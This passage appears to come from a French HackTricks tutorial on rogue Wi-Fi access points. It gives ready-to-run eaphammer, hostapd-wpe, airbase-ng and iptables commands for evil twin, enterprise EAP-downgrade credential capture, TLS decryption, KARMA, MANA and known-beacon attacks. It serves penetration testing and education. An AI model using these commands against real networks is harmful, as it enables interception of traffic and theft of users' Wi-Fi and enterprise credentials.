* Le protocole 802.11 d√©finit comment une station rejoint un ensemble de services √©tendu (ESS) mais ne sp√©cifie pas les crit√®res de s√©lection d'un ESS ou d'un point d'acc√®s (AP) √† l'int√©rieur.
* Les stations peuvent itin√©rer entre les AP partageant le m√™me ESSID, maintenant la connectivit√© √† travers un b√¢timent ou une zone.
* Le protocole exige une authentification de la station √† l'ESS mais ne mandate pas l'authentification de l'AP √† la station.

### Listes de r√©seaux pr√©f√©r√©s (PNL)

* Les stations stockent l'ESSID de chaque r√©seau sans fil auquel elles se connectent dans leur liste de r√©seaux pr√©f√©r√©s (PNL), ainsi que les d√©tails de configuration sp√©cifiques au r√©seau.
* Le PNL est utilis√© pour se connecter automatiquement aux r√©seaux connus, am√©liorant l'exp√©rience de l'utilisateur en simplifiant le processus de connexion.

### Balayage passif

* Les AP diffusent p√©riodiquement des trames de balise, annon√ßant leur pr√©sence et leurs caract√©ristiques, y compris l'ESSID de l'AP √† moins que la diffusion ne soit d√©sactiv√©e.
* Pendant le balayage passif, les stations √©coutent les trames de balise. Si l'ESSID d'une balise correspond √† une entr√©e dans le PNL de la station, la station peut se connecter automatiquement √† cet AP.
* La connaissance du PNL d'un appareil permet une exploitation potentielle en imitant l'ESSID d'un r√©seau connu, trompant l'appareil pour se connecter √† un AP frauduleux.

### Exploration active

* L'exploration active implique que les stations envoient des demandes de sondage pour d√©couvrir les AP √† proximit√© et leurs caract√©ristiques.
* Les demandes de sondage dirig√©es ciblent un ESSID sp√©cifique, aidant √† d√©tecter si un r√©seau particulier est √† port√©e, m√™me s'il s'agit d'un r√©seau cach√©.
* Les demandes de sondage de diffusion ont un champ SSID nul et sont envoy√©es √† tous les AP √† proximit√©, permettant √† la station de v√©rifier tout r√©seau pr√©f√©r√© sans divulguer le contenu de son PNL.

## Simple AP avec redirection vers Internet

Avant d'expliquer comment effectuer des attaques plus complexes, il va √™tre expliqu√© **comment** simplement **cr√©er** un **AP** et **rediriger** son **trafic** vers une interface connect√©e **√†** Internet.

En utilisant `ifconfig -a`, v√©rifiez que l'interface wlan pour cr√©er l'AP et l'interface connect√©e √† Internet sont pr√©sentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Cr√©ez le fichier de configuration `/etc/dnsmasq.conf` :
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite, **d√©finissez les adresses IP** et les **routes** :
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Et ensuite **d√©marrer** dnsmasq :
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Cr√©ez un fichier de configuration `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arr√™tez les processus g√™nants**, activez le **mode monitor**, et **d√©marrez hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Redirection et redirection
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Jumeau Mal√©fique

Une attaque de jumeau mal√©fique exploite la mani√®re dont les clients WiFi reconnaissent les r√©seaux, en se basant principalement sur le nom du r√©seau (ESSID) sans exiger que la station de base (point d'acc√®s) s'authentifie aupr√®s du client. Les points cl√©s incluent :

- **Difficult√© de Diff√©renciation** : Les appareils ont du mal √† distinguer entre les points d'acc√®s l√©gitimes et les points d'acc√®s frauduleux lorsqu'ils partagent le m√™me ESSID et le m√™me type de chiffrement. Les r√©seaux du monde r√©el utilisent souvent plusieurs points d'acc√®s avec le m√™me ESSID pour √©tendre la couverture de mani√®re transparente.
- **Roaming Client et Manipulation de la Connexion** : Le protocole 802.11 permet aux appareils de passer d'un point d'acc√®s √† un autre au sein du m√™me ESS. Les attaquants peuvent exploiter cela en incitant un appareil √† se d√©connecter de sa station de base actuelle et √† se connecter √† un point d'acc√®s frauduleux. Cela peut √™tre r√©alis√© en offrant un signal plus fort ou en perturbant la connexion au point d'acc√®s l√©gitime √† travers des m√©thodes telles que l'envoi de paquets de d√©authentification ou le brouillage.
- **D√©fis dans l'Ex√©cution** : Ex√©cuter avec succ√®s une attaque de jumeau mal√©fique dans des environnements avec de multiples points d'acc√®s bien plac√©s peut √™tre difficile. D√©authentifier un seul point d'acc√®s l√©gitime entra√Æne souvent l'appareil √† se connecter √† un autre point d'acc√®s l√©gitime √† moins que l'attaquant puisse d√©authentifier tous les points d'acc√®s √† proximit√© ou placer strat√©giquement le point d'acc√®s frauduleux.

Vous pouvez cr√©er un Jumeau Mal√©fique Ouvert tr√®s basique (sans capacit√© de router le trafic vers Internet) en faisant :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez √©galement cr√©er un Twin Mal√©fique en utilisant **eaphammer** (remarquez que pour cr√©er des twins mal√©fiques avec eaphammer, l'interface **NE DOIT PAS √™tre** en mode **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon : `Options : 5,6,7,8,9 (dans le menu de l'attaque Evil Twin).`

![](<../../.gitbook/assets/image (1085).png>)

Veuillez noter qu'en cas de sauvegarde par d√©faut d'un ESSID dans la PNL comme √©tant prot√©g√© par WPA, le p√©riph√©rique ne se connectera pas automatiquement √† un faux point d'acc√®s Open. Vous pouvez essayer de faire une attaque par d√©ni de service (DoS) sur le vrai AP et esp√©rer que l'utilisateur se connecte manuellement √† votre faux point d'acc√®s Open, ou vous pourriez faire une attaque par d√©ni de service sur le vrai AP et utiliser un WPA Evil Twin pour capturer le handshake (en utilisant cette m√©thode, vous ne pourrez pas laisser la victime se connecter √† vous car vous ne connaissez pas la PSK, mais vous pouvez capturer le handshake et essayer de le craquer).

_Certains syst√®mes d'exploitation et antivirus avertiront l'utilisateur que se connecter √† un r√©seau ouvert est dangereux..._

### WPA/WPA2 Evil Twin

Vous pouvez cr√©er un **Faux point d'acc√®s (Evil Twin) utilisant WPA/2** et si les appareils sont configur√©s pour se connecter √† cet SSID avec WPA/2, ils vont essayer de se connecter. Cependant, **pour compl√©ter le 4-way-handshake**, vous devez √©galement **conna√Ætre** le **mot de passe** que le client va utiliser. Si vous ne le **connaissez pas**, la **connexion ne sera pas compl√©t√©e**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Faux point d'acc√®s d'entreprise

Pour comprendre ces attaques, je recommanderais de lire d'abord la br√®ve [explication sur WPA Enterprise](./#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` a besoin d'un fichier de **configuration** pour fonctionner. Pour **automatiser** la g√©n√©ration de ces configurations, vous pouvez utiliser [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (t√©l√©chargez le fichier python √† l'int√©rieur de _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez s√©lectionner diff√©rentes choses telles que le ssid, le canal, les fichiers utilisateur, cret/cl√©, les param√®tres dh, la version wpa et l'auth...

[**Utilisation de hostapd-wpe avec EAP-TLS pour permettre √† n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utilisation d'EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par d√©faut, EAPHammer propose ces m√©thodes d'authentification (remarquez que GTC est le premier √† essayer d'obtenir des mots de passe en clair, suivi de l'utilisation de m√©thodes d'authentification plus robustes) :
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ceci est la m√©thodologie par d√©faut pour √©viter les longs temps de connexion. Cependant, vous pouvez √©galement sp√©cifier au serveur les m√©thodes d'authentification de la plus faible √† la plus forte:
```
--negotiate weakest
```
Ou vous pourriez √©galement utiliser :

* `--negotiate gtc-downgrade` pour utiliser une impl√©mentation de r√©trogradation GTC hautement efficace (mots de passe en clair)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` pour sp√©cifier manuellement les m√©thodes offertes (en offrant les m√™mes m√©thodes d'authentification dans le m√™me ordre que l'organisation, l'attaque sera beaucoup plus difficile √† d√©tecter).
* [Trouvez plus d'informations dans le wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Utilisation d'Airgeddon**

`Airgeddon` peut utiliser des certificats g√©n√©r√©s pr√©c√©demment pour offrir une authentification EAP aux r√©seaux WPA/WPA2-Entreprise. Le faux r√©seau r√©trogradera le protocole de connexion en EAP-MD5 afin de **capturer l'utilisateur et le MD5 du mot de passe**. Ensuite, l'attaquant peut essayer de craquer le mot de passe.\
`Airggedon` vous offre la possibilit√© d'une attaque **Evil Twin continue (bruyante)** ou de **cr√©er uniquement l'attaque Evil jusqu'√† ce que quelqu'un se connecte (discr√®te).**

![](<../../.gitbook/assets/image (933).png>)

### D√©bogage des tunnels TLS PEAP et EAP-TTLS dans les attaques Evil Twins

_Cette m√©thode a √©t√© test√©e dans une connexion PEAP mais comme je d√©chiffre un tunnel TLS arbitraire, cela devrait √©galement fonctionner avec EAP-TTLS_

√Ä l'int√©rieur de la **configuration** de _hostapd-wpe_, **commentez** la ligne contenant _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` √† `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Cela fera en sorte que `hostapd-wpe` **√©change les cl√©s en utilisant RSA** au lieu de DH, vous pourrez donc **d√©chiffrer** le trafic ult√©rieurement en **connaissant la cl√© priv√©e du serveur**.

Maintenant, lancez l'**Evil Twin** en utilisant **`hostapd-wpe`** avec cette configuration modifi√©e comme d'habitude. D√©marrez √©galement **`wireshark`** sur l'**interface** qui effectue l'attaque Evil Twin.

Maintenant ou plus tard (lorsque vous avez d√©j√† captur√© quelques tentatives d'authentification), vous pouvez ajouter la cl√© priv√©e RSA √† wireshark dans : `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ajoutez une nouvelle entr√©e et remplissez le formulaire avec ces valeurs : **Adresse IP = any** -- **Port = 0** -- **Protocole = data** -- **Fichier cl√©** (**s√©lectionnez votre fichier cl√©**, pour √©viter les probl√®mes, s√©lectionnez un fichier cl√© **non prot√©g√© par mot de passe**).

![](<../../.gitbook/assets/image (684).png>)

Et regardez l'onglet **"TLS d√©chiffr√©"** :

![](<../../.gitbook/assets/image (228).png>)

## Attaque KARMA, MANA, Loud MANA et Beacons connus

### Listes noires/blanches ESSID et MAC

Diff√©rents types de listes de filtres de contr√¥le d'acc√®s aux m√©dias (MFACLs) et leurs modes correspondants et leurs effets sur le comportement d'un Point d'Acc√®s (AP) malveillant :

1. **Liste blanche bas√©e sur MAC** :
* Le rogue AP r√©pondra uniquement aux demandes de sondage des appareils sp√©cifi√©s dans la liste blanche, restant invisible pour tous les autres non r√©pertori√©s.
2. **Liste noire bas√©e sur MAC** :
* Le rogue AP ignorera les demandes de sondage des appareils figurant sur la liste noire, rendant effectivement le rogue AP invisible pour ces appareils sp√©cifiques.
3. **Liste blanche bas√©e sur SSID** :
* Le rogue AP r√©pondra uniquement aux demandes de sondage pour des ESSIDs sp√©cifiques r√©pertori√©s, le rendant invisible pour les appareils dont les listes de r√©seaux pr√©f√©r√©s (PNLs) ne contiennent pas ces ESSIDs.
4. **Liste noire bas√©e sur SSID** :
* Le rogue AP ne r√©pondra pas aux demandes de sondage pour les ESSIDs sp√©cifiques sur la liste noire, le rendant invisible pour les appareils recherchant ces r√©seaux particuliers.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Cette m√©thode permet √† un **attaquant de cr√©er un point d'acc√®s (AP) malveillant qui r√©pond √† toutes les demandes de sondes** des appareils cherchant √† se connecter √† des r√©seaux. Cette technique **trompe les appareils en les incitant √† se connecter √† l'AP de l'attaquant** en imitant les r√©seaux recherch√©s par les appareils. Une fois qu'un appareil envoie une demande de connexion √† cet AP frauduleux, il √©tablit la connexion, amenant l'appareil √† se connecter par erreur au r√©seau de l'attaquant.

### MANA

Ensuite, **les appareils ont commenc√© √† ignorer les r√©ponses de r√©seau non sollicit√©es**, r√©duisant l'efficacit√© de l'attaque karma originale. Cependant, une nouvelle m√©thode, connue sous le nom d'attaque **MANA**, a √©t√© introduite par Ian de Villiers et Dominic White. Cette m√©thode implique que le rogue AP **capture les listes de r√©seaux pr√©f√©r√©s (PNL) des appareils en r√©pondant √† leurs demandes de sondes de diffusion** avec des noms de r√©seaux (SSIDs) pr√©c√©demment sollicit√©s par les appareils. Cette attaque sophistiqu√©e contourne les protections contre l'attaque karma originale en exploitant la mani√®re dont les appareils se souviennent et priorisent les r√©seaux connus.

L'attaque MANA fonctionne en surveillant √† la fois les demandes de sondes dirig√©es et de diffusion des appareils. Pour les demandes dirig√©es, elle enregistre l'adresse MAC de l'appareil et le nom du r√©seau demand√©, ajoutant ces informations √† une liste. Lorsqu'une demande de diffusion est re√ßue, l'AP r√©pond avec des informations correspondant √† l'un des r√©seaux de la liste de l'appareil, incitant l'appareil √† se connecter au rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Une attaque **Loud MANA** est une strat√©gie avanc√©e pour les cas o√π les appareils n'utilisent pas de sondage dirig√© ou lorsque leurs listes de r√©seaux pr√©f√©r√©s (PNL) sont inconnues de l'attaquant. Elle repose sur le principe que les **appareils dans la m√™me zone ont probablement des noms de r√©seau en commun dans leurs PNL**. Au lieu de r√©pondre de mani√®re s√©lective, cette attaque diffuse des r√©ponses de sondage pour chaque nom de r√©seau (ESSID) trouv√© dans les PNL combin√©es de tous les appareils observ√©s. Cette approche large augmente la chance qu'un appareil reconnaisse un r√©seau familier et tente de se connecter au point d'acc√®s (AP) frauduleux.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Attaque de balise connue

Lorsque l'attaque **Loud MANA** ne suffit pas, l'**attaque de balise connue** pr√©sente une autre approche. Cette m√©thode **force la connexion en simulant un point d'acc√®s qui r√©pond √† tout nom de r√©seau, en parcourant une liste d'ESSIDs potentiels** d√©riv√©s d'une liste de mots. Cela simule la pr√©sence de nombreux r√©seaux, esp√©rant correspondre √† un ESSID dans la liste des r√©seaux pr√©f√©r√©s de la victime, incitant une tentative de connexion √† l'AP fabriqu√©. L'attaque peut √™tre amplifi√©e en la combinant avec l'option `--loud` pour une tentative plus agressive d'attirer les appareils.

Eaphammer a mis en ≈ìuvre cette attaque en tant qu'attaque MANA o√π tous les ESSIDs dans une liste sont charg√©s (vous pouvez √©galement combiner cela avec `--loud` pour cr√©er une attaque Loud MANA + balises connues) :
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Attaque de rafale de balises connue**

L'**attaque de rafale de balises connue** implique **la diffusion rapide de trames de balises pour chaque ESSID r√©pertori√© dans un fichier**. Cela cr√©e un environnement dense de r√©seaux factices, augmentant consid√©rablement la probabilit√© que les appareils se connectent au point d'acc√®s frauduleux, en particulier lorsqu'elle est combin√©e √† une attaque MANA. Cette technique exploite la vitesse et le volume pour submerger les m√©canismes de s√©lection de r√©seau des appareils.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** est un protocole permettant aux appareils de se connecter directement les uns aux autres en utilisant le Wi-Fi sans avoir besoin d'un point d'acc√®s sans fil traditionnel. Cette capacit√© est int√©gr√©e √† divers appareils de l'Internet des objets (IdO), tels que les imprimantes et les t√©l√©visions, facilitant la communication directe d'appareil √† appareil. Une caract√©ristique notable de Wi-Fi Direct est qu'un appareil prend le r√¥le d'un point d'acc√®s, appel√© le propri√©taire du groupe, pour g√©rer la connexion.

La s√©curit√© des connexions Wi-Fi Direct est √©tablie gr√¢ce √† **Wi-Fi Protected Setup (WPS)**, qui prend en charge plusieurs m√©thodes d'appariement s√©curis√©, notamment :

* **Configuration par bouton-poussoir (PBC)**
* **Saisie du code PIN**
* **Communication en champ proche (NFC)**

Ces m√©thodes, en particulier la saisie du code PIN, sont susceptibles aux m√™mes vuln√©rabilit√©s que le WPS dans les r√©seaux Wi-Fi traditionnels, ce qui en fait des cibles pour des vecteurs d'attaque similaires.

### D√©tournement EvilDirect

**Le d√©tournement EvilDirect** est une attaque sp√©cifique au Wi-Fi Direct. Il refl√®te le concept d'une attaque Evil Twin mais cible les connexions Wi-Fi Direct. Dans ce sc√©nario, un attaquant se fait passer pour un propri√©taire de groupe l√©gitime dans le but de tromper les appareils pour qu'ils se connectent √† une entit√© malveillante. Cette m√©thode peut √™tre ex√©cut√©e en utilisant des outils comme `airbase-ng` en sp√©cifiant le canal, l'ESSID et l'adresse MAC de l'appareil usurp√© :

## R√©f√©rences

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

√Ä FAIRE : Jetez un ≈ìil √† [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (connexion avec Facebook et imitation de WPA dans les portails captifs)

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en bugs !

**Perspectives sur le piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s sur le piratage en temps r√©el**\
Restez inform√© du monde du piratage en √©volution rapide gr√¢ce √† des actualit√©s et des informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes au bug lanc√©es et des mises √† jour cruciales de la plateforme

Rejoignez-nous sur [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
